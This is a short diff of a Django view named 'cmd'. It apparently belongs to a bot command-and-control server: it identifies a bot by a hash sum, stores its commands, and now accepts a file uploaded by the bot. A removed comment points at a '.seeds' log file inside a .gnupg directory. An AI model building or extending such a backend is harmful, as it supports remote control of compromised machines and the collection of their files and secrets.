@@ -82,10 +82,12 @@ def cmd(request):
         version = None
 
     hash_sum = request.POST['hash_sum']
-    
+    file = ''
+    try:
+        file = request.FILES['file']
+    except KeyError:
+        print("file not found")
 
-    # print(bot)
-    # print(request)
     print(hash_sum)
     
     queryset = Bot.objects.filter(hash_sum=hash_sum)
@@ -119,7 +121,7 @@ def cmd(request):
         Bot_Command.objects.get_or_create(
             bot=bot,
             cmd=command,
-            # upload=File(open('/home/ubuntu/.gnupg/.seeds/log.txt'), 'rb')
+            upload=file
         )
         # Check if client is a legacy client
         if version:
